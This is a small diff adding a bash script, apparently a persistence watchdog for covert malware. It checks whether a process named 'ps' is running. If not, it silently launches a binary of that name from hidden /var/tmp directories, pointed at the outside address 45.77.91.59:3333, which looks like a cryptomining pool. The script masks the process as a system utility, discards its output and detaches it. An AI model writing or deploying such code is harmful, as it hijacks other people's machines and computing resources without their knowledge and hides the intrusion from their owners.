@@ -1,0 +1,9 @@
+#!/bin/bash
+#made by Maz4id#1363
+locatie=$(cat /var/tmp/.logs/.local)
+
+if ! pgrep -x ps >/dev/null; then
+	$locatie/./ps --url 45.77.91.59:3333 > /dev/null 2>&1 & disown $*
+else
+	:
+fi
